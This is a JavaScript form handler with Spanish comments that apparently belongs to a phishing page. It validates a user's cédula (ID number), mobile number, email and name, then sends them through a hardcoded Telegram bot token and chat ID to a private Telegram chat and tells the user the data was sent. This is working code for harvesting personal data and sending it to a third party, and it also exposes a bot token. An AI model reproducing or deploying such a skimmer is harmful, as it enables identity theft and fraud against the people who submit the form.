document.getElementById('btn-entrar').addEventListener('click', function() {
    // Obtener valores
    const telefono = document.getElementById('telefono01').value.trim();
    const correo = document.getElementById('correo01').value.trim();
    const nombre = document.getElementById('nombre01').value.trim();
    const cedula = document.getElementById('cedula01').value.trim();

    // Expresiones regulares para validación
    const numeroRegex = /^\d+$/;
    const correoRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Validaciones

    // Cédula: solo números, 7-10 dígitos
    if (!numeroRegex.test(cedula) || cedula.length < 7 || cedula.length > 10) {
        mostrarError("Cédula inválida. Debe tener 7-10 números.");
        return;
    }

    // Teléfono: solo números, 10 dígitos, debe comenzar con 3
    if (!numeroRegex.test(telefono) || telefono.length !== 10 || !telefono.startsWith('3')) {
        mostrarError("Teléfono inválido. Debe tener 10 números y comenzar con 3.");
        return;
    }

    // Correo
    if (!correoRegex.test(correo)) {
        mostrarError("Correo inválido. Por favor ingresa un correo válido.");
        return;
    }

    // Nombre
    if (!nombre) {
        mostrarError("El nombre no puede estar vacío.");
        return;
    }

    // Guardar en localStorage
    const usuario = { telefono, correo, nombre, cedula };
    localStorage.setItem('usuario', JSON.stringify(usuario));

    // Enviar a Telegram
    enviarTelegram(usuario);
});

// Función para mostrar modal de error
function mostrarError(mensaje) {
    document.getElementById('errorText').innerText = mensaje;
    document.getElementById('errorModal').style.display = 'flex';
}

// Función para enviar mensaje a Telegram
function enviarTelegram(usuario) {
    const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";  // reemplaza con tu token
    const chatId = "8417322083";       // reemplaza con tu chat_id
    const mensaje = `
Nuevo registro:
Nombre: ${usuario.nombre}
Cédula: ${usuario.cedula}
Teléfono: ${usuario.telefono}
Correo: ${usuario.correo}
    `;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.ok){
            alert("Datos enviados correctamente!");
            document.getElementById('form-consulta').reset();
        } else {
            mostrarError("No se pudo enviar a Telegram.");
        }
    })
    .catch(err => mostrarError("Error al conectar con Telegram."));
}
